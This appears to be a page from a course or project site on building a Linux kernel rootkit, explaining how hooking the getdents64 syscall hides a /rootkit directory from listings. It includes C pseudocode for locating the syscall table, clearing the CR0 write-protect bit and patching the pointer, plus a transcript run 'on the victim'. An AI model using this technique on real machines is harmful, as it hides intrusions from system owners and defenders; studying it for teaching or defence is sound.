---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Hide Files & Directories"
  description="Hooks the getdents64 syscall to remove the rootkit directory from any directory listing."
  badge="Optional"
  points="2 pts"
  slug="hide-files"
  prev={{ href: "/features/hide-module", label: "Hide Module" }}
  next={{ href: "/features/hide-lines", label: "Hide Lines" }}
>

<section class="section">
  <h2 class="section-title">// How it works</h2>
  <div class="prose">
    <p>
      Every tool that lists files, <code>ls</code>, <code>find</code>, <code>stat</code>, eventually
      calls the <strong><code>getdents64</code></strong> system call, which asks the kernel to fill a buffer
      with directory entries (<code>struct linux_dirent64</code>). By replacing the <code>getdents64</code>
      pointer in the kernel's <strong>syscall table</strong> with our own function, we can intercept every
      directory listing and remove entries we want hidden.
    </p>
    <p>
      After the real <code>getdents64</code> runs and fills the buffer, our hook iterates the entries
      and splices out any whose name starts with a hidden prefix (e.g. <code>/rootkit</code>).
      From userland's perspective the directory simply doesn't exist.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Syscall hooking diagram</h2>
  <div class="diagram">
    <svg viewBox="0 0 680 280" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <defs>
        <marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
        <marker id="ay" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#e3b341"/></marker>
        <marker id="ar" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#f85149"/></marker>
      </defs>
      <!-- ls userland -->
      <rect x="20" y="20" width="120" height="35" rx="5" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="80" y="37" text-anchor="middle" fill="#e6edf3" font-size="12">ls /</text>
      <text x="80" y="50" text-anchor="middle" fill="#8b949e" font-size="10">userland</text>

      <!-- syscall -->
      <line x1="80" y1="55" x2="80" y2="80" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>
      <text x="100" y="71" fill="#8b949e" font-size="10">syscall</text>

      <!-- syscall table -->
      <rect x="20" y="80" width="200" height="50" rx="5" fill="#161b22" stroke="#e3b341" stroke-width="1" stroke-opacity="0.6"/>
      <text x="120" y="100" text-anchor="middle" fill="#e3b341" font-size="11" font-weight="bold">Syscall Table</text>
      <text x="120" y="116" text-anchor="middle" fill="#8b949e" font-size="10">sys_call_table[__NR_getdents64]</text>
      <text x="120" y="128" text-anchor="middle" fill="#00ff41" font-size="10">→ hooked_getdents64()</text>

      <!-- hooked fn -->
      <rect x="280" y="80" width="180" height="110" rx="5" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.5"/>
      <text x="370" y="100" text-anchor="middle" fill="#00ff41" font-size="11" font-weight="bold">hooked_getdents64()</text>
      <text x="370" y="118" text-anchor="middle" fill="#8b949e" font-size="10">1. call real getdents64()</text>
      <text x="370" y="133" text-anchor="middle" fill="#8b949e" font-size="10">2. iterate dirent buffer</text>
      <text x="370" y="148" text-anchor="middle" fill="#8b949e" font-size="10">3. remove hidden entries</text>
      <text x="370" y="163" text-anchor="middle" fill="#8b949e" font-size="10">4. return filtered buffer</text>
      <text x="370" y="178" text-anchor="middle" fill="#8b949e" font-size="10">   to userland</text>
      <line x1="220" y1="105" x2="278" y2="105" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>

      <!-- real getdents64 -->
      <rect x="520" y="80" width="150" height="35" rx="5" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="595" y="97" text-anchor="middle" fill="#8b949e" font-size="11">real getdents64()</text>
      <text x="595" y="110" text-anchor="middle" fill="#8b949e" font-size="10">fills buffer</text>
      <line x1="460" y1="95" x2="518" y2="95" stroke="#30363d" stroke-width="1.5" marker-end="url(#a)"/>

      <!-- WP bit -->
      <rect x="280" y="210" width="380" height="55" rx="5" fill="#161b22" stroke="#f85149" stroke-width="1" stroke-opacity="0.4"/>
      <text x="470" y="230" text-anchor="middle" fill="#f85149" font-size="11" font-weight="bold">CR0 Write-Protect trick</text>
      <text x="470" y="248" text-anchor="middle" fill="#8b949e" font-size="10">Syscall table is read-only by default.</text>
      <text x="470" y="262" text-anchor="middle" fill="#8b949e" font-size="10">Clear WP bit in CR0 → patch pointer → restore WP.</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// How the syscall table is patched</h2>
  <div class="prose">
    <p>
      Modern kernels mark the syscall table as read-only (the CPU's <strong>Write Protect (WP) bit</strong>
      in control register <code>CR0</code>). To patch a pointer, the rootkit temporarily clears this bit,
      writes the new function pointer, then immediately restores the WP bit.
    </p>
  </div>
  <div class="code-block">
    <div class="code-header"><span>Syscall hook pattern (pseudocode)</span><span class="lang">C</span></div>
    <pre><code>{`// Find syscall table address (via kallsyms or kprobes)
unsigned long *sct = (unsigned long *)kallsyms_lookup_name("sys_call_table");

// Save original pointer
orig_getdents64 = (void *)sct[__NR_getdents64];

// Disable WP bit to write to read-only page
write_cr0(read_cr0() & ~0x00010000UL);
sct[__NR_getdents64] = (unsigned long)hooked_getdents64;
write_cr0(read_cr0() |  0x00010000UL);

// In the hook:
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);   // call real syscall
    // iterate dirent buffer, remove entries matching hidden prefixes
    return ret;
}`}</code></pre>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Verification</h2>
  <div class="code-block">
    <div class="code-header"><span>On the victim</span></div>
    <pre><code>{`$ ls /
bin  boot  dev  etc  home  lib  ...
# /rootkit directory is not shown

$ ls -la / | grep rootkit
# no output : hidden at the kernel level

$ cat /rootkit/uuid      # but the directory IS there
c3f9a721-...             # and accessible by root`}</code></pre>
  </div>
</section>

</FeaturePage>
